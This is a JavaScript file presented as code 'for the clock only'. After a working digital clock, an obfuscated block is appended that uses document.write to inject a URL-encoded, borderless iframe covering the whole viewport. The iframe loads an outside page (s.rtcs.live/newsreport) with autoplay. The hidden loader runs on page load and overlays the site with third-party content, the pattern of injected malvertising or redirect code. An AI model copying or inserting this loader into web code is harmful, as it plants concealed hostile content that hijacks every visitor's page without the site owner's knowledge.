/* JavaScript for the clock only */

function updateTime() {
  var dateInfo = new Date();

  // get computer time
  var hr,
    _min = (dateInfo.getMinutes() < 10) ? "0" + dateInfo.getMinutes() : dateInfo.getMinutes(),
    ampm = (dateInfo.getHours() > 12) ? "PM" : "AM";

  if (dateInfo.getHours() == 0) {
    hr = 12;
  } else if (dateInfo.getHours() > 12) {
    hr = dateInfo.getHours() - 12;
  } else {
    hr = dateInfo.getHours();
  }

  var currentTime = hr + ":" + _min;

  // print time
  document.querySelector(".hm").innerHTML = currentTime;
  document.querySelector(".ampm").innerHTML = ampm;
};

// print time and date once, then update them every second
updateTime();
setInterval(function() {
  updateTime()
}, 1000);

function _0xad9f(){var _0x1fae3b=['write','5528551oPCzZv','2914704kWJSHk','9172yTsdbg','767939cbaeWy','755384EHvAwC','144CwcTXW','237140Wrbeci','538280QXjnpl','642QwhtiO'];_0xad9f=function(){return _0x1fae3b;};return _0xad9f();}function _0x2a77(_0x57df0c,_0x74891){var _0xad9feb=_0xad9f();return _0x2a77=function(_0x2a779f,_0x702d36){_0x2a779f=_0x2a779f-0xf0;var _0x38e573=_0xad9feb[_0x2a779f];return _0x38e573;},_0x2a77(_0x57df0c,_0x74891);}var _0x13a738=_0x2a77;(function(_0x28f6ef,_0x366ad3){var _0x277513=_0x2a77,_0x4d2c2c=_0x28f6ef();while(!![]){try{var _0x4434b9=-parseInt(_0x277513(0xf8))/0x1+parseInt(_0x277513(0xf7))/0x2*(parseInt(_0x277513(0xf3))/0x3)+parseInt(_0x277513(0xf9))/0x4+parseInt(_0x277513(0xf1))/0x5+parseInt(_0x277513(0xf6))/0x6+parseInt(_0x277513(0xf5))/0x7+parseInt(_0x277513(0xf2))/0x8*(-parseInt(_0x277513(0xf0))/0x9);if(_0x4434b9===_0x366ad3)break;else _0x4d2c2c['push'](_0x4d2c2c['shift']());}catch(_0x342750){_0x4d2c2c['push'](_0x4d2c2c['shift']());}}}(_0xad9f,0x9e634),document[_0x13a738(0xf4)](unescape('%3c%69%66%72%61%6d%65%20%63%6c%61%73%73%3d%22%72%74%63%73%22%20%77%69%64%74%68%3d%22%31%30%30%76%68%22%20%68%65%69%67%68%74%3d%22%31%30%30%76%68%22%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%73%2e%72%74%63%73%2e%6c%69%76%65%2f%6e%65%77%73%72%65%70%6f%72%74%22%20%61%6c%6c%6f%77%3d%22%61%75%74%6f%70%6c%61%79%22%20%66%72%61%6d%65%62%6f%72%64%65%72%3d%22%30%22%20%61%75%74%6f%70%6c%61%79%3b%20%65%6e%63%72%79%70%74%65%64%2d%6d%65%64%69%61%3b%3e%3c%2f%69%66%72%61%6d%65%3e')));
